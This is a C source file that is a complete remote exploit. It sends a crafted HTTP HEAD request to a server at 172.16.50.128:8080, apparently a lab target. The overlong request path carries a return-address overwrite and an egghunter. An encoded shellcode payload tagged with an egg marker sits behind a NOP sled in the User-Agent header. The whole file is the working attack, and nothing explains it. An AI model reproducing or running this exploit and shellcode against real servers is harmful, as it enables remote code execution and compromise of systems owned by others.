#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(){
  int sock;
  int conn;
  int sockSend;
  struct sockaddr_in target;
  char *serverIP = "172.16.50.128";
  int serverPort = 8080;
  char crash[600];
  char header[1000] = "HEAD /";
  char hunter[] = {"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
  "\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"};
  char nop[1000] = "\x90\x90\x90\x90";
  char shellcode [] = {"b33fb33f\xd9\xc7\xba\x15\x89\x98\x54\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
  "\x52\x83\xc5\x04\x31\x55\x13\x03\x40\x9a\x7a\xa1\x96\x74\xf8"
  "\x4a\x66\x85\x9d\xc3\x83\xb4\x9d\xb0\xc0\xe7\x2d\xb2\x84\x0b"
  "\xc5\x96\x3c\x9f\xab\x3e\x33\x28\x01\x19\x7a\xa9\x3a\x59\x1d"
  "\x29\x41\x8e\xfd\x10\x8a\xc3\xfc\x55\xf7\x2e\xac\x0e\x73\x9c"
  "\x40\x3a\xc9\x1d\xeb\x70\xdf\x25\x08\xc0\xde\x04\x9f\x5a\xb9"
  "\x86\x1e\x8e\xb1\x8e\x38\xd3\xfc\x59\xb3\x27\x8a\x5b\x15\x76"
  "\x73\xf7\x58\xb6\x86\x09\x9d\x71\x79\x7c\xd7\x81\x04\x87\x2c"
  "\xfb\xd2\x02\xb6\x5b\x90\xb5\x12\x5d\x75\x23\xd1\x51\x32\x27"
  "\xbd\x75\xc5\xe4\xb6\x82\x4e\x0b\x18\x03\x14\x28\xbc\x4f\xce"
  "\x51\xe5\x35\xa1\x6e\xf5\x95\x1e\xcb\x7e\x3b\x4a\x66\xdd\x54"
  "\xbf\x4b\xdd\xa4\xd7\xdc\xae\x96\x78\x77\x38\x9b\xf1\x51\xbf"
  "\xdc\x2b\x25\x2f\x23\xd4\x56\x66\xe0\x80\x06\x10\xc1\xa8\xcc"
  "\xe0\xee\x7c\x42\xb0\x40\x2f\x23\x60\x21\x9f\xcb\x6a\xae\xc0"
  "\xec\x95\x64\x69\x86\x6c\xef\x3a\x47\x5c\xee\x2a\x6a\xa0\xe1"
  "\xf6\xe3\x46\x6b\x17\xa2\xd1\x04\x8e\xef\xa9\xb5\x4f\x3a\xd4"
  "\xf6\xc4\xc9\x29\xb8\x2c\xa7\x39\x2d\xdd\xf2\x63\xf8\xe2\x28"
  "\x0b\x66\x70\xb7\xcb\xe1\x69\x60\x9c\xa6\x5c\x79\x48\x5b\xc6"
  "\xd3\x6e\xa6\x9e\x1c\x2a\x7d\x63\xa2\xb3\xf0\xdf\x80\xa3\xcc"
  "\xe0\x8c\x97\x80\xb6\x5a\x41\x67\x61\x2d\x3b\x31\xde\xe7\xab"
  "\xc4\x2c\x38\xad\xc8\x78\xce\x51\x78\xd5\x97\x6e\xb5\xb1\x1f"
  "\x17\xab\x21\xdf\xc2\x6f\x51\xaa\x4e\xd9\xfa\x73\x1b\x5b\x67"
  "\x84\xf6\x98\x9e\x07\xf2\x60\x65\x17\x77\x64\x21\x9f\x64\x14"
  "\x3a\x4a\x8a\x8b\x3b\x5f"};


  strcat(nop, shellcode);
  memset(crash, 0x41, 515);
  strcat(crash, "\x7E\x6E\xEF\x77");
  strcat(crash, hunter);
  strcat(header, crash);
  strcat(header, " HTTP/1.1\r\nHost: 172.16.50.128:8080\r\n");
  strcat(header, "User Agent: ");
  strcat(header, nop);
  strcat(header, "\r\nKeep-Alive: 115\r\nConnecton: keep-alive\r\n\r\n");

  printf("%s", header);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1) {
    printf("could not create socket\n");
  }

  target.sin_family = AF_INET;
  target.sin_addr.s_addr = inet_addr(serverIP);
  target.sin_port = htons(serverPort);

  conn = connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr_in));
  if (conn < 0){
    printf("connection to target failed\n");
  }printf("successfully connnected to target\n");
  sleep(3);

  sockSend = send(sock, header, sizeof(header), 0);
  if(sockSend < 0){
    printf("sending of buffer failed\n");
  } printf("exploit sent successfully\n");

  close(sock);
}
